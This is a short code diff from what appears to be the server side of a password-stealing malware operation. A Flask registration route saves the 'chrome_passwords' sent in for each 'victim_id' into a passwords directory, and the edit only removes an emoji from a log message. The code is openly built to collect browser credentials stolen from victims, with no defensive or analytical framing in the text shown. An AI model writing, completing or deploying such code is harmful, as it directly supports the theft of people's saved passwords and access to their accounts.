@@ -65,7 +65,7 @@ def register():
             pwd_file = os.path.join(PASSWORDS_DIR, f"{victim_id}_passwords.json")
             with open(pwd_file, "w") as f:
                 json.dump(data.get('chrome_passwords', []), f, indent=2)
-            print(f"🔐 Passwords saved")
+            print(f" Passwords saved")
         
         return jsonify({"status": "success"}), 200
         
